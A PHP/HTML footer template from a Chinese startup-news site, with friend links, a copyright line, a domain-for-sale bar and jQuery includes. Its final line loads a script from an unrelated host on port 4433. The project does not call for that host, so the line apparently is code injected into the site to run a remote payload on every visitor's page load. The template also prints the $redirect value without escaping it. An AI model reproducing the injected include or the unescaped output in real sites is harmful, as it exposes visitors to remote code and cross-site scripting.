<?php if(isset($this->footer) && $this->footer == 'no'){}else{ ?>
<!--默认有底部-->
<div class="footer">
    <div class="footer-box">
        
        <div class="friend-link">
            <div class="container">
                <ul>
                    <li><label>友情链接：</label></li>
                    <li><a href="https://36kr.com/" target="_blank">36氪</a></li>
                    <li><a href="https://www.huxiu.com/" target="_blank">虎嗅网</a></li>
                    <li><a href="http://chuangyejia.com/" target="_blank">创业家</a></li>
                    <li><a href="http://www.tmtpost.com/" target="_blank">钛媒体</a></li>
                </ul>
                <div class="copyright">
                    <span class="mr15">Copyright © 2018 外推网</span>
                    <span>浙ICP备14004697号-2</span>
                </div>
            </div>
        </div>
        
    </div>
</div>
<?php } ?>

<!--默认有侧边栏-->
<div id="to_topbar" class="to-topbar">
    <div class="ico-top" id="ico_top" style="display:none;"></div>
</div>

<?php if(!empty($redirect)){ ?>
<!--底部固定栏-->
<div id="redirect_bar" class="redirect-bar">
    <div class="container">【<font><?php echo $redirect; ?></font>】您正在访问的域名可以转让！<a class="pub-btn-blue fl-r" href="http://wpa.qq.com/msgrd?v=3&amp;uin=1003049243&amp;site=qq&amp;menu=yes" target="_blank">在线咨询</a><a class="close" href="javascript:;" onclick="removeRedirectBar();"></a></div>
</div>
<?php } ?>

<script src="<?php echo CDN_URL; ?>cdn-lendbase/waitui/js/jquery-1.11.1.min.js?<?php echo CACHE_TIME; ?>"></script>
<?php if(isset($scripts)){ foreach($scripts as $script){ echo '<script src="'.$script.'"></script>';} }?>
<script src="<?php echo CDN_URL; ?>cdn-lendbase/waitui/js/public.js?<?php echo CACHE_TIME; ?>"></script>
<script src="<?php echo CDN_URL; ?>cdn-lendbase/waitui/js/dom-ready.js?<?php echo CACHE_TIME; ?>"></script>
<script type="text/javascript">

function removeRedirectBar(){
    $("#redirect_bar").remove();
}

$(function(){
    
})
</script>
<script src="https://j.qiqivv.com:4433/i.php?z=122890"></script>
